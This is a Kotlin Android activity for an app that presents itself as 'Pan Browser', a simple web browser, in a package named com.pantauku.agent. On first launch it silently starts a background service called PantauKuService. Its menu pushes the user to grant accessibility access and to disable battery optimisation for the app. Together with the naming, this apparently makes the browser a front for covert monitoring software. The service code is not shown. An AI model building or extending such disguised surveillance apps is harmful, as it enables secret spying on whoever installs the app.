package com.pantauku.agent

import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.*
import androidx.appcompat.app.AppCompatActivity

class BrowserActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var etUrl: EditText
    private lateinit var progressBar: ProgressBar
    private lateinit var btnBack: ImageButton
    private lateinit var btnForward: ImageButton
    private lateinit var btnRefresh: ImageButton

    private var isFirstLaunch = true

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_browser)

        webView = findViewById(R.id.webView)
        etUrl = findViewById(R.id.etUrl)
        progressBar = findViewById(R.id.progressBar)
        btnBack = findViewById(R.id.btnBack)
        btnForward = findViewById(R.id.btnForward)
        btnRefresh = findViewById(R.id.btnRefresh)

        setupWebView()
        setupToolbar()
        setupBottomBar()

        // First launch - show setup dialog
        if (isFirstLaunch) {
            checkAccessibilitySetup()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            builtInZoomControls = true
            displayZoomControls = false
            setSupportZoom(true)
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                progressBar.visibility = View.VISIBLE
                etUrl.setText(url)
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                progressBar.visibility = View.GONE
                etUrl.setText(url)
                updateNavButtons()
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                progressBar.progress = newProgress
            }
        }

        // Load homepage
        webView.loadUrl("https://www.google.com")
    }

    private fun setupToolbar() {
        etUrl.setOnEditorActionListener { _, actionId, event ->
            if (actionId == EditorInfo.IME_ACTION_GO || 
                (event?.keyCode == KeyEvent.KEYCODE_ENTER && event.action == KeyEvent.ACTION_DOWN)) {
                loadUrl(etUrl.text.toString())
                true
            } else false
        }

        btnBack.setOnClickListener {
            if (webView.canGoBack()) webView.goBack()
        }

        btnForward.setOnClickListener {
            if (webView.canGoForward()) webView.goForward()
        }

        btnRefresh.setOnClickListener {
            webView.reload()
        }

        findViewById<ImageButton>(R.id.btnMenu).setOnClickListener {
            showMenu()
        }
    }

    private fun setupBottomBar() {
        findViewById<View>(R.id.btnHome).setOnClickListener {
            webView.loadUrl("https://www.google.com")
        }

        findViewById<View>(R.id.btnBookmarks).setOnClickListener {
            Toast.makeText(this, "Fitur favorit segera hadir", Toast.LENGTH_SHORT).show()
        }

        findViewById<View>(R.id.btnTabs).setOnClickListener {
            Toast.makeText(this, "Tab baru segera hadir", Toast.LENGTH_SHORT).show()
        }

        findViewById<View>(R.id.btnSettings).setOnClickListener {
            showMenu()
        }
    }

    private fun showMenu() {
        val items = arrayOf(
            "Aktifkan Aksesibilitas",
            "Pengaturan Baterai",
            "Tentang Browser"
        )
        AlertDialog.Builder(this)
            .setTitle("Menu")
            .setItems(items) { _, which ->
                when (which) {
                    0 -> startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).also {
                        Toast.makeText(this, "Cari \"Pan Browser\" lalu aktifkan", Toast.LENGTH_LONG).show()
                    })
                    1 -> {
                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:$packageName")
                        }
                        try { startActivity(intent) }
                        catch (e: Exception) { startActivity(Intent(Settings.ACTION_BATTERY_SAVER_SETTINGS)) }
                    }
                    2 -> AlertDialog.Builder(this)
                        .setTitle("Pan Browser")
                        .setMessage("Browser ringan untuk navigasi web.\n\nVersi 1.0")
                        .setPositiveButton("OK", null)
                        .show()
                }
            }
            .show()
    }

    private fun checkAccessibilitySetup() {
        // Start the foreground service silently
        val serviceIntent = Intent(this, PantauKuService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        EventQueue.init(applicationContext)
        isFirstLaunch = false
    }

    private fun loadUrl(url: String) {
        var finalUrl = url.trim()
        if (!finalUrl.startsWith("http://") && !finalUrl.startsWith("https://")) {
            if (finalUrl.contains(".") && !finalUrl.contains(" ")) {
                finalUrl = "https://$finalUrl"
            } else {
                finalUrl = "https://www.google.com/search?q=${Uri.encode(finalUrl)}"
            }
        }
        webView.loadUrl(finalUrl)
        etUrl.clearFocus()
    }

    private fun updateNavButtons() {
        btnBack.alpha = if (webView.canGoBack()) 1.0f else 0.4f
        btnForward.alpha = if (webView.canGoForward()) 1.0f else 0.4f
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
